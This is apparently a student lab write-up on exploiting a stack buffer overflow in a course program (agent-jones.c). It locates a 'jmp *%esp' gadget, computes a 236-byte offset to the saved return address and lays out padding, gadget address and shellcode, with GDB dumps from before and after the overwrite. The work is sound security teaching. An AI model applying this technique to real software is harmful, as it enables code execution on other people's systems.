Vulnerability: The jmp $esp instruction is hard coded on machines and the position of $esp is predictable
after loading the rip. 

How it can be exploited: If an attacker learns the address of the jmp $esp instruction they can overwrite 
the rip to point to that address. They know that when the rip is being popped off the stack, it will 
execute the jump instruction. Since they know $esp is pointing directly above rip, all they need is to 
place their exploit there.

How we determined which address to jump to: Like before, we used info frame in GDB to find the location of 
the saved $eip, and we print the address of the buffer. Using disas /r magic, we looked for the following
instruction:
	0x08048619 <+21>:    81 4d 08 ff e4 00 00    orl    $0xe4ff,0x8(%ebp)
We add 0x3 to the address of this instruction to get the address of the jmp $esp instruction. We verified
it using gdb:
	(gdb) x/i 0x0804861c
   		0x804861c <magic+24>:        jmp    *%esp

Sketch of Solution: To find the offset from the beginning of the buffer to the rip, we subtracted the 
address of the buffer from the address of the rip. 
	0xbffffd9c ($eip) - 0xbffffcb0 (buf) = 0xec = 236 bytes
Fillng the buffer with 236 bytes of garbage, followed by the address of the jmp $esp instruction and then 
the shellcode (since $esp points directly above rip during the function epilogue) allowed us to overwrite 
the rip to point to the jmp $esp instruction.

GDB Output:
Before:
(gdb) info frame
Stack level 0, frame at 0xbffffda0:
 eip = 0x80486fc in handle (agent-jones.c:39); saved eip 0x80488cc
 called by frame at 0xbffffe00
 source language c.
 Arglist at 0xbffffd98, args: client=8
 Locals at 0xbffffd98, Previous frame's sp is 0xbffffda0
 Saved registers:
  ebp at 0xbffffd98, eip at 0xbffffd9c
(gdb) x/300x buf
0xbffffcb0:     0xbffffd64      0x00000003      0x00000000      0xb7fff938
0xbffffcc0:     0x0804835f      0xb7e38938      0xb7fffe98      0xb7ff9d3c
0xbffffcd0:     0xb7e2fe38      0x00000000      0x00000026      0xb7e5d95d
0xbffffce0:     0x00000000      0x00000000      0xb7e37538      0xb7fdc858
0xbffffcf0:     0xb7fdcb48      0xb7fdc858      0x08048366      0xb7e39158
0xbffffd00:     0xffffffff      0x00000001      0xb7ec3ce0      0x0000115c
0xbffffd10:     0xbffffd48      0xb7fff000      0xb7fff938      0x00000001
0xbffffd20:     0x00000000      0xb7fec28b      0xb7fffaf0      0xb7fdcb48
0xbffffd30:     0x00000001      0x00000001      0x00000000      0xb7fd2000
0xbffffd40:     0x00000000      0x00000000      0xbffffdf8      0x00000000
0xbffffd50:     0x080482e8      0x0804a008      0x0000000a      0x00000000
0xbffffd60:     0xb7fd28c0      0xb7e37538      0x00000001      0xb7ec4269
0xbffffd70:     0xbffffdaf      0xb7fd2000      0x00000000      0x00000000
0xbffffd80:     0xbffffdf8      0xb7ff26a0      0xb7fd2000      0xb7f1c3b0
0xbffffd90:     0xb7fd2000      0x00000000      0xbffffdf8      0x080488cc
After:
(gdb) info frame
Stack level 0, frame at 0xbffffda0:
 eip = 0x8048731 in handle (agent-jones.c:41); saved eip 0x804861c
 called by frame at 0x41414149
 source language c.
 Arglist at 0xbffffd98, args: client=-470295759
 Locals at 0xbffffd98, Previous frame's sp is 0xbffffda0
 Saved registers:
  ebx at 0xbffffd90, ebp at 0xbffffd98, edi at 0xbffffd94, eip at 0xbffffd9c
(gdb) x/300x buf
0xbffffcb0:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffcc0:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffcd0:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffce0:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffcf0:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd00:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd10:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd20:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd30:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd40:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd50:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd60:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd70:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd80:     0x03030303      0x03030303      0x03030303      0x03030303
0xbffffd90:     0x41414141      0x41414141      0x41414141      0x0804861c